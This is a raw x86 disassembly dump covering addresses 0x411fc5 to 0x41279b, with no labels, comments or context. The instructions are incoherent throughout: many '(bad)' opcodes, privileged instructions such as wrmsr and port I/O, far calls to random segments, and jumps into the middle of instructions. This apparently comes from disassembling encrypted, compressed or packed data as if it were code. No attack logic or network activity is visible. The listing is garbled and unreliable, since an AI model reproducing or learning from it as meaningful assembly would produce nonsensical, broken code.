  411fc5:	popf   
  411fc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fc7:	sbb    BYTE PTR ds:0xff2f4aec,ah
  411fcd:	jns    0x411f87
  411fcf:	and    eax,DWORD PTR [ecx-0x7e]
  411fd2:	sbb    dh,BYTE PTR [edx]
  411fd4:	outs   dx,BYTE PTR ds:[esi]
  411fd5:	sub    edi,DWORD PTR [ebx]
  411fd7:	iret   
  411fd8:	repz out dx,eax
  411fda:	retf   0x6571
  411fdd:	mov    ebp,0x737b8598
  411fe2:	cmp    al,0x67
  411fe4:	mov    ecx,0xbc41462f
  411fe9:	mov    ds:0x657e6d9c,al
  411fee:	sbb    BYTE PTR [edx+eax*8+0x225eb7d4],dh
  411ff5:	sbb    DWORD PTR [ebx+0x24],0xad312a2c
  411ffc:	hlt    
  411ffd:	ja     0x41205c
  411fff:	cmp    BYTE PTR [ebx],ch
  412001:	or     al,0xb3
  412003:	adc    BYTE PTR ds:0x312da036,0x51
  41200a:	test   eax,0xafa151f5
  41200f:	mov    bh,0x4e
  412011:	inc    ecx
  412012:	lock mov al,ds:0xbd6afc5e
  412018:	rol    DWORD PTR [eax+0x4c],1
  41201b:	sbb    eax,0xf78ea908
  412020:	neg    DWORD PTR [ebx-0x73]
  412023:	and    eax,0x7d062805
  412028:	inc    esp
  412029:	xor    DWORD PTR [edx-0x110a01a4],ebp
  41202f:	jmp    0x411fe3
  412031:	loop   0x41204a
  412033:	nop    DWORD PTR [ecx]
  412036:	pushf  
  412037:	sbb    ecx,ecx
  412039:	inc    edx
  41203a:	das    
  41203b:	and    DWORD PTR [edi+esi*2-0x79],0xa5d2a628
  412043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412044:	repnz into 
  412046:	pop    edx
  412047:	xor    eax,0x73626276
  41204c:	lods   al,BYTE PTR ds:[esi]
  41204d:	stos   BYTE PTR es:[edi],al
  41204e:	push   0xffffffc1
  412050:	inc    DWORD PTR [ebx-0x1d83e7f9]
  412056:	jecxz  0x412041
  412058:	sub    DWORD PTR [ebp+0xd],0x578c9be9
  41205f:	inc    esi
  412060:	and    eax,0xcf862954
  412065:	jge    0x4120c7
  412067:	jle    0x4120e2
  412069:	imul   esi,DWORD PTR [ebx-0x5796a8f1],0xffffffd9
  412070:	jg     0x4120ac
  412072:	or     cl,BYTE PTR [ecx-0xc]
  412075:	aas    
  412076:	add    eax,0x12e31cad
  41207b:	mov    dl,0xf8
  41207d:	xchg   edx,eax
  41207e:	mov    BYTE PTR [edi-0x741afc4e],al
  412084:	imul   edi,DWORD PTR [edx+0x5c],0x646653b9
  41208b:	aaa    
  41208c:	pop    eax
  41208d:	cmp    BYTE PTR [edx-0x63],ch
  412090:	xor    al,0xd6
  412092:	mov    eax,ds:0x878ca4e3
  412097:	mov    eax,ds:0x12e33ab7
  41209c:	in     eax,dx
  41209d:	xor    eax,0x8240b41c
  4120a2:	sub    ecx,DWORD PTR [ebx-0x4355fc83]
  4120a8:	xchg   ecx,eax
  4120a9:	jo     0x412107
  4120ab:	ss jp  0x412061
  4120ae:	cmc    
  4120af:	imul   DWORD PTR [esi-0x2b]
  4120b2:	pop    esp
  4120b3:	mov    eax,0x87d3ba4b
  4120b8:	sbb    eax,0xd533865b
  4120bd:	mov    ecx,0xa84668ef
  4120c2:	aas    
  4120c3:	mov    ch,BYTE PTR [ecx]
  4120c5:	or     eax,eax
  4120c7:	aas    
  4120c8:	(bad)  
  4120c9:	adc    edi,edx
  4120cb:	pop    ebp
  4120cc:	cmp    DWORD PTR [ebp-0x2a801675],ecx
  4120d2:	retf   0x3029
  4120d5:	sbb    al,0x42
  4120d7:	imul   esp,DWORD PTR [edx],0xffffffe6
  4120da:	adc    ebp,DWORD PTR [edx]
  4120dc:	dec    edx
  4120dd:	lds    esi,FWORD PTR [edi]
  4120df:	mov    dh,0x61
  4120e1:	push   eax
  4120e2:	out    0x94,al
  4120e4:	jmp    0x412139
  4120e6:	jae    0x4120d3
  4120e8:	pop    esi
  4120e9:	jne    0x4120d5
  4120eb:	imul   sp,WORD PTR [eiz*2+0x39b5db8b],0xff83
  4120f4:	jge    0x4120d7
  4120f6:	jge    0x412166
  4120f8:	push   ebx
  4120f9:	push   ss
  4120fa:	shl    BYTE PTR [ebx],cl
  4120fc:	je     0x4120f7
  4120fe:	mov    al,0x3c
  412100:	ficomp WORD PTR [edi]
  412102:	xchg   esp,eax
  412103:	rol    BYTE PTR [ecx-0x5898795d],1
  412109:	icebp  
  41210a:	out    0x45,al
  41210c:	mov    ebx,0xba840997
  412111:	sub    al,0xec
  412113:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412114:	push   es
  412115:	or     DWORD PTR ds:[ebp+0x61],ebx
  412119:	sub    BYTE PTR [esi+0x7f70fd0e],0x58
  412120:	and    cl,BYTE PTR [edi+0x76dc5658]
  412126:	pop    edx
  412127:	je     0x412110
  412129:	lock xor dl,BYTE PTR [esi]
  41212c:	xor    DWORD PTR [edi],eax
  41212e:	mov    ebp,0xd11a8b5c
  412133:	lahf   
  412134:	adc    edi,ecx
  412136:	lahf   
  412137:	(bad)  
  412138:	sbb    esi,edx
  41213a:	sahf   
  41213b:	call   0xd911:0xdbe75de5
  412142:	dec    ebp
  412143:	or     eax,0xd00b32d3
  412148:	dec    eax
  412149:	inc    eax
  41214a:	sbb    BYTE PTR fs:[eax+edx*4-0x43],0x37
  412150:	inc    esp
  412151:	xor    BYTE PTR es:[esi-0x3b3f4167],cl
  412158:	mov    eax,ds:0xc6fd28a7
  41215d:	rcr    edi,0xd8
  412160:	push   esi
  412161:	add    cl,BYTE PTR [eax+edx*4]
  412164:	xchg   edx,eax
  412165:	fdivr  QWORD PTR [eax-0x60]
  412168:	push   ecx
  412169:	jae    0x412195
  41216b:	or     BYTE PTR [ebx-0x31],ah
  41216e:	xlat   BYTE PTR ds:[ebx]
  41216f:	cdq    
  412170:	pop    es
  412171:	xlat   BYTE PTR ds:[ebx]
  412172:	cmp    ch,ah
  412174:	icebp  
  412175:	mov    edx,0x9801161e
  41217a:	add    BYTE PTR [edx+0x29],dh
  41217d:	div    DWORD PTR [edi+ecx*1+0x45103f52]
  412184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412185:	imul   edx,esp,0x89b10884
  41218b:	sahf   
  41218c:	mov    ebx,0x13c9ac8f
  412191:	xchg   BYTE PTR [eax-0x4bbdd947],ah
  412197:	dec    esi
  412198:	pop    ebp
  412199:	mov    dh,0x75
  41219b:	test   DWORD PTR [ecx+eax*1-0x62],ecx
  41219f:	pusha  
  4121a0:	pushf  
  4121a1:	or     ah,ch
  4121a3:	mov    edi,0x665c8bc6
  4121a8:	fstp   DWORD PTR [ebx+eax*8]
  4121ab:	xchg   ebp,eax
  4121ac:	cmp    bl,BYTE PTR [eax]
  4121ae:	add    ebx,DWORD PTR [ebx+edx*2+0xd5aab97]
  4121b5:	pop    ebp
  4121b6:	pop    ebp
  4121b7:	add    esp,DWORD PTR [ebx-0x2f]
  4121ba:	test   dl,0xe1
  4121bd:	lods   al,BYTE PTR ds:[esi]
  4121be:	div    BYTE PTR [ebp-0x10]
  4121c1:	add    DWORD PTR [eax],edx
  4121c3:	adc    BYTE PTR [ecx],0x5e
  4121c6:	iret   
  4121c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121c8:	mov    al,BYTE PTR [eax+0x7d72645c]
  4121ce:	add    eax,0x9fecd31e
  4121d3:	pop    ebx
  4121d4:	sahf   
  4121d5:	repz jmp 0x41218b
  4121d8:	inc    edi
  4121d9:	call   0x298:0x99e7a030
  4121e0:	push   esp
  4121e1:	ins    BYTE PTR es:[edi],dx
  4121e2:	cli    
  4121e3:	mov    esp,0x4b572ee2
  4121e8:	fdiv   DWORD PTR [esi+0x3862ca3c]
  4121ee:	add    BYTE PTR [edi+esi*4+0x49ac739c],0x1e
  4121f6:	ret    0xea8e
  4121f9:	loope  0x412248
  4121fb:	dec    eax
  4121fd:	add    al,cl
  4121ff:	sbb    al,0xd2
  412201:	int3   
  412202:	aas    
  412203:	mov    bh,0xa7
  412205:	xchg   DWORD PTR [edi+0x4cfc8730],edi
  41220b:	and    esp,0x49793898
  412211:	lock sbb ebp,DWORD PTR [edi]
  412214:	popf   
  412215:	repnz pop ebx
  412217:	and    esi,DWORD PTR [esi-0x10]
  41221a:	pop    ebp
  41221b:	jecxz  0x4121a7
  41221d:	push   ss
  41221e:	mov    esi,0xdb4cf9a5
  412223:	ins    BYTE PTR es:[edi],dx
  412224:	or     eax,0x413ed659
  412229:	or     ah,BYTE PTR [edx+0x67]
  41222c:	mov    esi,0xf991da1f
  412231:	ret    0x672f
  412234:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412235:	sbb    al,0x38
  412237:	add    ebx,esi
  412239:	jmp    0x9487:0xb59748c8
  412240:	xchg   edi,eax
  412241:	jmp    0x41226f
  412243:	push   eax
  412244:	into   
  412245:	aad    0xa9
  412247:	adc    BYTE PTR [ebx],0xfd
  41224a:	mov    bh,0x45
  41224c:	jo     0x41223e
  41224e:	sub    ebp,0xffffff81
  412251:	xor    WORD PTR [esi+0x203e4d35],ax
  412258:	stos   BYTE PTR es:[edi],al
  412259:	fstp   QWORD PTR [esi+0x18b7f2bc]
  41225f:	jle    0x412280
  412261:	(bad)  
  412262:	mov    dh,0x8
  412264:	into   
  412265:	inc    edi
  412266:	adc    ah,BYTE PTR [ecx-0x63]
  412269:	shr    cl,1
  41226b:	jmp    0x4122ca
  41226d:	(bad)  
  41226e:	push   ecx
  41226f:	xchg   esp,eax
  412270:	imul   BYTE PTR [edx]
  412272:	outs   dx,DWORD PTR ds:[esi]
  412273:	(bad)  
  412274:	idiv   BYTE PTR [edx+0x44]
  412277:	in     eax,0xda
  412279:	inc    ecx
  41227a:	xor    al,0x3f
  41227c:	push   ecx
  41227d:	into   
  41227e:	jmp    0x8286:0xfc52ff82
  412285:	jg     0x41221f
  412287:	bound  ebx,QWORD PTR [edi-0x2d31e54b]
  41228d:	and    eax,0xe72c636f
  412292:	mov    dl,0x88
  412294:	xchg   esi,eax
  412295:	dec    eax
  412296:	dec    esi
  412297:	mov    al,ds:0x946ea04c
  41229c:	loope  0x41228a
  41229e:	aad    0xb7
  4122a0:	add    eax,DWORD PTR [edx]
  4122a2:	popa   
  4122a3:	inc    ebx
  4122a4:	fimul  WORD PTR [edx]
  4122a6:	push   DWORD PTR [ebx-0x4ecaa42c]
  4122ac:	sub    eax,0xec95565b
  4122b1:	or     eax,0xaa99199b
  4122b6:	test   al,0x5e
  4122b8:	pop    edi
  4122b9:	xor    ebp,DWORD PTR [esi+0x4f4415d4]
  4122bf:	ror    bl,cl
  4122c1:	enter  0x79b6,0x3c
  4122c5:	test   ebp,ecx
  4122c7:	fld    DWORD PTR [esi+0x3ce12472]
  4122cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122ce:	fnsave [eax+edx*8+0x0]
  4122d2:	inc    ebp
  4122d3:	sbb    edx,DWORD PTR [ebp+0x65]
  4122d6:	jle    0x41226b
  4122d8:	call   0x10e8:0xa8ce621f
  4122df:	wrmsr  
  4122e1:	push   ss
  4122e2:	jp     0x412357
  4122e4:	cdq    
  4122e5:	xchg   esp,eax
  4122e6:	(bad)  
  4122e7:	out    0x8d,eax
  4122e9:	push   ss
  4122ea:	pop    ecx
  4122eb:	inc    ecx
  4122ec:	aam    0x1e
  4122ee:	mov    ah,0x77
  4122f0:	inc    esp
  4122f1:	(bad)  
  4122f2:	mov    ebp,0x7db5c286
  4122f7:	gs push ds
  4122f9:	je     0x4122df
  4122fb:	push   edi
  4122fc:	test   eax,0xff5affca
  412301:	adc    dh,al
  412303:	and    bl,bh
  412305:	ret    0xeda3
  412308:	in     al,0x63
  41230a:	dec    edi
  41230b:	pop    ecx
  41230c:	rol    BYTE PTR [eax-0x66],cl
  41230f:	ds stc 
  412311:	sub    al,0xd0
  412313:	mov    ebx,0x40223bd2
  412318:	aaa    
  412319:	xor    BYTE PTR [ecx-0x7cf3f214],cl
  41231f:	in     eax,dx
  412320:	and    dl,BYTE PTR [esi+0x2db9e862]
  412326:	push   edx
  412327:	inc    ecx
  412328:	retf   
  412329:	cmp    eax,0x4b1f2402
  41232e:	in     eax,dx
  41232f:	ror    BYTE PTR [ebx+0x37be0def],0x87
  412336:	in     eax,0x17
  412338:	cmp    eax,0xbdce661e
  41233d:	imul   esp,edi,0x6c
  412340:	mov    dh,0x67
  412342:	int    0x7c
  412344:	push   0xffffffc4
  412346:	popa   
  412347:	cli    
  412348:	add    al,0x96
  41234a:	mov    ah,BYTE PTR [edi+0x7866433c]
  412350:	add    BYTE PTR [ebx-0xd],dl
  412353:	(bad)  
  412354:	out    dx,al
  412355:	test   DWORD PTR [ebx-0x6d224579],ebx
  41235b:	stos   BYTE PTR es:[edi],al
  41235c:	clc    
  41235d:	add    eax,0x8df880cf
  412362:	ret    
  412363:	imul   eax,DWORD PTR es:[esi+0x62],0x5da461dd
  41236b:	ror    DWORD PTR [eax],0x1
  41236e:	(bad)  
  41236f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412370:	xchg   edi,eax
  412371:	jnp    0x412313
  412373:	mov    ah,0x9f
  412375:	inc    ecx
  412376:	adc    eax,ebx
  412378:	aam    0x4d
  41237a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41237b:	fmulp  st(2),st
  41237d:	or     DWORD PTR es:[esi],0x8590943d
  412384:	and    dl,BYTE PTR [ecx+0x43]
  412387:	inc    edx
  412388:	int    0x1a
  41238a:	dec    ecx
  41238b:	pop    ds
  41238c:	out    dx,al
  41238d:	ins    BYTE PTR es:[edi],dx
  41238e:	mov    ebp,0x4eb120b1
  412393:	imul   ecx,DWORD PTR [esi-0x24f5df9c],0x38cd5cb1
  41239d:	or     al,0x7a
  41239f:	out    dx,al
  4123a0:	adc    al,0x4
  4123a2:	adc    ebp,DWORD PTR [ebp+ebp*4+0x34]
  4123a6:	jbe    0x4123d2
  4123a8:	xchg   edx,eax
  4123a9:	inc    edi
  4123aa:	mov    bh,0x2d
  4123ac:	inc    edx
  4123ad:	enter  0x46c,0x33
  4123b1:	mov    ch,0xcf
  4123b3:	and    BYTE PTR [edx+0x3f],ah
  4123b6:	int3   
  4123b7:	(bad)  
  4123b9:	push   eax
  4123ba:	pop    ebx
  4123bb:	mov    dl,dh
  4123bd:	fwait
  4123be:	xchg   dl,dh
  4123c0:	pop    ecx
  4123c1:	mov    WORD PTR [edi+0x2e52d698],?
  4123c7:	ss (bad) 
  4123c9:	rcl    BYTE PTR [ebx],cl
  4123cb:	jp     0x412438
  4123cd:	mov    DWORD PTR [esi+0x135cc9e],ecx
  4123d3:	(bad)  
  4123d4:	popa   
  4123d5:	repz add eax,DWORD PTR [eax+0x5dbb7261]
  4123dc:	ss hlt 
  4123de:	lods   eax,DWORD PTR ds:[esi]
  4123df:	out    dx,al
  4123e0:	int    0x3b
  4123e2:	pop    es
  4123e3:	aas    
  4123e4:	jecxz  0x4123f1
  4123e6:	jno    0x412408
  4123e8:	fs add ebp,0x4022be2c
  4123ef:	xor    DWORD PTR [edi],edx
  4123f1:	add    DWORD PTR [ecx],edx
  4123f3:	or     al,BYTE PTR [ebx]
  4123f5:	loop   0x412392
  4123f7:	inc    edx
  4123f8:	ja     0x412388
  4123fa:	retf   
  4123fb:	or     cl,BYTE PTR [eax]
  4123fd:	jno    0x412451
  4123ff:	and    edi,DWORD PTR [ebx-0x19f4f50]
  412405:	mov    WORD PTR [edx-0x1],fs
  412408:	pop    edx
  412409:	in     al,0xbc
  41240b:	cmp    DWORD PTR [edx-0x65],0xd9e6948d
  412412:	leave  
  412413:	lods   al,BYTE PTR ds:[esi]
  412414:	mov    esi,DWORD PTR [eax+ecx*8+0x3d7b8c9e]
  41241b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41241c:	add    cl,bh
  41241e:	ud0    ecx,ebp
  412421:	call   0xe2f3:0x7b30b82e
  412428:	add    BYTE PTR [esi+0x3c],bh
  41242b:	pushf  
  41242c:	hlt    
  41242d:	sub    eax,0x87e3e1c7
  412432:	push   edx
  412433:	sub    ebp,esp
  412435:	adc    eax,0xae14e31a
  41243a:	xchg   ecx,eax
  41243b:	les    ebx,FWORD PTR [ecx]
  41243d:	imul   esp,DWORD PTR [ecx+0x70],0x7f
  412441:	push   edi
  412442:	inc    ebx
  412443:	mov    ds:0x4aff1143,al
  412448:	scas   eax,DWORD PTR es:[edi]
  412449:	mov    dh,0xb8
  41244b:	mov    BYTE PTR [eax+0xe27d6b1],ch
  412451:	fwait
  412452:	and    ecx,DWORD PTR [ebp-0x22]
  412455:	jmp    0xaee6a7a9
  41245a:	adc    al,0x4e
  41245c:	push   edi
  41245d:	cmc    
  41245e:	shl    DWORD PTR [edx-0x4c],cl
  412461:	xlat   BYTE PTR ds:[ebx]
  412462:	and    dh,cl
  412464:	mov    eax,0xd06ab8d6
  412469:	je     0x41247d
  41246b:	lahf   
  41246c:	jp     0x41242e
  41246e:	outs   dx,DWORD PTR ds:[esi]
  41246f:	neg    BYTE PTR ds:0xa933ac48
  412475:	popf   
  412476:	div    BYTE PTR [eax+0x23]
  412479:	int3   
  41247a:	mov    ch,0xbf
  41247c:	push   edi
  41247d:	mov    ah,al
  41247f:	fs push es
  412481:	push   cs
  412482:	and    BYTE PTR fs:[ebp-0x2b],0x8
  412487:	cmp    ebp,DWORD PTR [edi]
  412489:	cld    
  41248a:	js     0x412503
  41248c:	inc    eax
  41248d:	add    dh,BYTE PTR [edi]
  41248f:	les    esi,FWORD PTR [eax-0x35]
  412492:	mov    WORD PTR [esi+0x2b],?
  412495:	push   eax
  412496:	pop    esp
  412497:	into   
  412498:	bound  eax,QWORD PTR [ebx-0x675267f1]
  41249e:	inc    edx
  41249f:	xchg   ebp,eax
  4124a0:	shl    ecx,cl
  4124a2:	retf   0x3bb5
  4124a5:	cld    
  4124a6:	outs   dx,BYTE PTR ds:[esi]
  4124a7:	pop    eax
  4124a8:	inc    edx
  4124a9:	nop
  4124aa:	push   edx
  4124ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124ac:	jno    0x4124db
  4124ae:	ret    
  4124af:	mov    esp,DWORD PTR [edi+0x2ce443cb]
  4124b5:	pop    ss
  4124b6:	(bad)  
  4124b7:	cmc    
  4124b8:	loop   0x4124ef
  4124ba:	mov    ah,0x4e
  4124bc:	push   ds
  4124bd:	mov    ebp,DWORD PTR [esi-0x48]
  4124c0:	mov    esp,DWORD PTR [edi+0x6b]
  4124c3:	icebp  
  4124c4:	daa    
  4124c5:	cmp    al,0xe0
  4124c7:	dec    esp
  4124c8:	addr16 mov ah,0x2b
  4124cb:	xchg   ebx,eax
  4124cc:	fucomi st,st(7)
  4124ce:	adc    ch,dl
  4124d0:	mov    al,0x73
  4124d2:	mov    ah,0x83
  4124d4:	adc    DWORD PTR [edi-0x249c4903],edx
  4124da:	lods   al,BYTE PTR ds:[esi]
  4124db:	sbb    esp,ebx
  4124dd:	in     eax,0x78
  4124df:	(bad)  
  4124e1:	mov    bh,0x6d
  4124e3:	std    
  4124e4:	fbld   TBYTE PTR [ebx]
  4124e6:	sbb    esp,0x17
  4124e9:	(bad)  
  4124eb:	jne    0x4124eb
  4124ed:	add    BYTE PTR [eax],ch
  4124ef:	xor    eax,0xa31d1ce9
  4124f4:	push   eax
  4124f5:	sub    eax,0xcfa1f87e
  4124fa:	mov    esp,0x78a750de
  4124ff:	inc    edx
  412500:	data16 fwait
  412502:	or     DWORD PTR [ebx],esp
  412504:	scas   al,BYTE PTR es:[edi]
  412505:	mul    DWORD PTR [eax-0x29]
  412508:	mov    BYTE PTR [eax+0x73],bl
  41250b:	cli    
  41250c:	outs   dx,DWORD PTR ds:[esi]
  41250d:	dec    edx
  41250e:	and    ebp,DWORD PTR ds:0x46d361d6
  412514:	sub    BYTE PTR [eax-0x204b4de5],0xef
  41251b:	push   0x1e
  41251d:	mov    BYTE PTR [esi+0x240c6be1],cl
  412523:	call   0x9fd8:0x680fb2d6
  41252a:	stos   DWORD PTR es:[edi],eax
  41252b:	cmp    DWORD PTR [eax],edi
  41252d:	mov    dh,0xfb
  41252f:	aas    
  412530:	mov    ebp,0xac1de473
  412535:	add    DWORD PTR [esi-0x57],ebx
  412538:	push   esp
  412539:	mov    edx,0x93ddad87
  41253e:	jno    0x4125a6
  412540:	in     eax,dx
  412541:	pop    ecx
  412542:	dec    ecx
  412543:	call   0xdcaf:0x71524e5d
  41254a:	ins    BYTE PTR es:[edi],dx
  41254b:	fbld   TBYTE PTR [edi]
  41254d:	test   eax,0xc1617313
  412552:	sbb    eax,0x2a293cf2
  412557:	dec    ebx
  412558:	and    edx,DWORD PTR [esp+esi*1-0x54]
  41255c:	sub    edi,DWORD PTR [edi-0x7]
  41255f:	push   ss
  412560:	adc    eax,0x52e5c2a8
  412565:	push   edx
  412566:	push   0x6e7a43cc
  41256b:	and    BYTE PTR [edi+0x436ce289],cl
  412571:	clc    
  412572:	mov    ebx,0x7f35abb
  412577:	scas   eax,DWORD PTR es:[edi]
  412578:	mov    dl,0xbd
  41257a:	scas   eax,DWORD PTR es:[edi]
  41257b:	mov    ds:0x4bded40d,al
  412580:	push   edi
  412581:	shl    BYTE PTR [edx+edi*4-0x798c9dcd],cl
  412588:	(bad)  
  412589:	dec    esi
  41258a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41258b:	and    DWORD PTR [ebx+0x377a398],0xffffff8c
  412592:	jo     0x41252b
  412594:	aas    
  412595:	dec    edi
  412596:	inc    ecx
  412597:	scas   eax,DWORD PTR es:[edi]
  412598:	cmovne ebx,ebx
  41259b:	ins    BYTE PTR es:[edi],dx
  41259c:	add    BYTE PTR [eax],0xb1
  41259f:	cmp    ch,BYTE PTR [ebx+0x5d74d2aa]
  4125a5:	out    0xf7,al
  4125a7:	inc    ebp
  4125a8:	dec    edx
  4125a9:	mov    ebp,ebx
  4125ab:	add    al,BYTE PTR [ecx]
  4125ad:	pop    ds
  4125ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125af:	sub    DWORD PTR ds:0x7c51ac1c,edx
  4125b5:	scas   eax,DWORD PTR es:[edi]
  4125b6:	mov    WORD PTR [edx-0x7f],fs
  4125b9:	mov    ah,0x8b
  4125bb:	fsubr  st(5),st
  4125bd:	lods   eax,DWORD PTR ds:[esi]
  4125be:	pop    eax
  4125bf:	jb     0x412622
  4125c1:	das    
  4125c2:	fsub   QWORD PTR [edx-0x39b26103]
  4125c8:	mov    ebp,0x7c2c3eba
  4125cd:	push   0x37
  4125cf:	inc    ebp
  4125d0:	sub    BYTE PTR [edi-0x54303db8],dl
  4125d6:	add    ebx,0x74
  4125d9:	popa   
  4125da:	jmp    0xda7e5dde
  4125df:	xlat   BYTE PTR ds:[ebx]
  4125e0:	cmc    
  4125e1:	icebp  
  4125e2:	dec    ecx
  4125e3:	stos   BYTE PTR es:[edi],al
  4125e4:	stos   DWORD PTR es:[edi],eax
  4125e5:	xchg   edx,eax
  4125e6:	inc    ebp
  4125e7:	xchg   esp,eax
  4125e8:	jb     0x4125a8
  4125ea:	scas   eax,DWORD PTR es:[edi]
  4125eb:	neg    BYTE PTR [ebx+0xba060c5]
  4125f1:	fnstenv [edx+0x39]
  4125f4:	stos   DWORD PTR es:[edi],eax
  4125f5:	xchg   esp,eax
  4125f6:	adc    al,0xd6
  4125f8:	add    BYTE PTR [ebx],0x7d
  4125fb:	out    dx,eax
  4125fc:	sbb    al,0xf9
  4125fe:	mov    dh,0x10
  412600:	xchg   esi,eax
  412601:	jbe    0x412583
  412603:	sub    bl,BYTE PTR [edx-0x5ee70546]
  412609:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41260a:	test   BYTE PTR [edi-0x3b1866d8],0x5e
  412611:	aam    0x3d
  412613:	stos   DWORD PTR es:[edi],eax
  412614:	aam    0x7
  412616:	fiadd  WORD PTR [ecx]
  412618:	add    DWORD PTR [edi+0x2ba14e02],0x3959471b
  412622:	jo     0x412625
  412624:	pop    esp
  412625:	inc    esi
  412626:	inc    esp
  412627:	xor    BYTE PTR [edx+0x7d],al
  41262a:	jbe    0x41261f
  41262c:	inc    ecx
  41262d:	push   cs
  41262e:	push   ebx
  41262f:	fistp  DWORD PTR [eax]
  412631:	jl     0x412608
  412633:	dec    edi
  412634:	push   ebx
  412635:	sbb    al,0x8d
  412637:	arpl   WORD PTR [edi-0x533521fc],sp
  41263d:	mov    ecx,0xd9df9e5
  412642:	cmc    
  412643:	dec    eax
  412644:	jmp    0x9059d385
  412649:	push   es
  41264a:	ret    0x302c
  41264d:	fbstp  TBYTE PTR [edi+esi*4]
  412650:	(bad)  
  412651:	mov    ds:0x36f98dc0,eax
  412656:	je     0x412634
  412658:	inc    edi
  412659:	cmp    ch,BYTE PTR [ebx+0x7e8dd318]
  41265f:	mov    gs,WORD PTR [edi-0x6b]
  412662:	arpl   WORD PTR [eax],dx
  412664:	jecxz  0x41262e
  412666:	sub    eax,DWORD PTR [edx+0x2da6495d]
  41266c:	ins    BYTE PTR es:[edi],dx
  41266d:	inc    edi
  41266e:	pop    esi
  41266f:	call   0x3fe2:0xe39e97ac
  412676:	ds xor ecx,eax
  412679:	sbb    al,0xf3
  41267b:	das    
  41267c:	lea    esp,[ebx]
  41267e:	mov    bh,0x54
  412680:	imul   DWORD PTR ds:0x564a96af
  412686:	icebp  
  412687:	int3   
  412688:	les    eax,FWORD PTR [edx-0x7e]
  41268b:	sub    cl,BYTE PTR [edi+0x763b8aaf]
  412691:	xchg   esp,eax
  412692:	inc    esp
  412693:	in     eax,0x8f
  412695:	retf   
  412696:	push   0xc965873d
  41269b:	and    dl,BYTE PTR [esi]
  41269d:	sbb    al,0x51
  41269f:	(bad)  
  4126a0:	push   ecx
  4126a1:	scas   al,BYTE PTR es:[edi]
  4126a2:	push   ds
  4126a3:	push   cs
  4126a4:	stos   DWORD PTR es:[edi],eax
  4126a5:	arpl   WORD PTR [eax+0x62220b41],si
  4126ab:	test   al,0x28
  4126ad:	scas   al,BYTE PTR es:[edi]
  4126ae:	ds (bad) 
  4126b0:	pusha  
  4126b1:	ret    
  4126b2:	ret    0x443a
  4126b5:	add    eax,0xddeb663f
  4126ba:	repz dec esp
  4126bc:	lea    ecx,[ebx+0x1c]
  4126bf:	scas   al,BYTE PTR es:[edi]
  4126c0:	(bad)  
  4126c1:	cwde   
  4126c2:	shr    BYTE PTR [edi+0x6b196eb4],0xe7
  4126c9:	xchg   ebx,eax
  4126ca:	xchg   ebx,edi
  4126cc:	popf   
  4126cd:	jno    0x412708
  4126cf:	xchg   ecx,eax
  4126d0:	mov    cl,0xcd
  4126d2:	adc    cl,cl
  4126d4:	fmul   QWORD PTR ss:[edi-0x79d8b098]
  4126db:	push   ss
  4126dc:	or     eax,DWORD PTR [esi-0x10826b17]
  4126e2:	daa    
  4126e3:	cwde   
  4126e4:	int3   
  4126e5:	fisttp DWORD PTR [esi-0x5f]
  4126e8:	iret   
  4126e9:	lock cld 
  4126eb:	xchg   ecx,eax
  4126ec:	dec    ecx
  4126ed:	xor    al,0x1b
  4126ef:	jnp    0x412676
  4126f1:	icebp  
  4126f2:	out    dx,eax
  4126f3:	aam    0x36
  4126f5:	push   esi
  4126f6:	(bad)  
  4126f8:	loopne 0x412753
  4126fa:	fnstsw WORD PTR [eax-0x1bdd39f5]
  412700:	adc    eax,0x888065d9
  412705:	scas   eax,DWORD PTR es:[edi]
  412706:	sbb    eax,0x1efd90b7
  41270b:	js     0x4126aa
  41270d:	mov    ch,bh
  41270f:	mov    dl,0xd5
  412711:	ficomp DWORD PTR [edi+0x44]
  412714:	push   ds
  412715:	jae    0x412770
  412717:	ret    
  412718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412719:	cmp    ch,bl
  41271b:	mov    edi,0x8f05a7f5
  412720:	add    al,dl
  412722:	loope  0x41273f
  412724:	fucomip st,st(6)
  412726:	pop    esi
  412727:	test   al,0xde
  412729:	arpl   WORD PTR [esi-0x8],si
  41272c:	stc    
  41272d:	jge    0x412748
  41272f:	addr16 call 0x4f98c643
  412735:	(bad)  
  412737:	xchg   ebx,eax
  412738:	repnz mov eax,ds:0xa1ce2db0
  41273e:	sti    
  41273f:	push   edi
  412740:	loope  0x4127b5
  412742:	mov    ebx,0xf20443d1
  412747:	cld    
  412748:	in     al,0xc7
  41274a:	mov    ebx,0x5a57e3bb
  41274f:	movaps xmm2,XMMWORD PTR [ecx]
  412752:	ds jae 0x41274d
  412755:	dec    edx
  412756:	jge    0x412725
  412758:	out    dx,eax
  412759:	push   0x20a57027
  41275e:	pop    ebp
  41275f:	push   0x1
  412761:	pusha  
  412762:	sti    
  412763:	pop    ebp
  412764:	xchg   ebx,eax
  412765:	and    edi,eax
  412767:	rol    DWORD PTR [eax+0x18],0xae
  41276b:	sub    dl,bh
  41276d:	loopne 0x412725
  41276f:	add    BYTE PTR ds:0x7559b02f,0x8e
  412776:	sbb    edx,DWORD PTR [ebx+ebx*4]
  412779:	inc    edx
  41277a:	pushf  
  41277b:	add    dh,ch
  41277d:	xor    DWORD PTR [ebx],ecx
  41277f:	ja     0x412715
  412781:	adc    al,0x4
  412783:	loopne 0x4127af
  412785:	call   FWORD PTR [edi+esi*1]
  412788:	sub    eax,0x738db33d
  41278d:	shr    DWORD PTR [edx-0x1f],1
  412790:	setl   BYTE PTR [ebx+esi*8]
  412794:	pop    ebp
  412795:	sub    ebp,DWORD PTR ds:0x20981e1e
  41279b:	in     al,dx
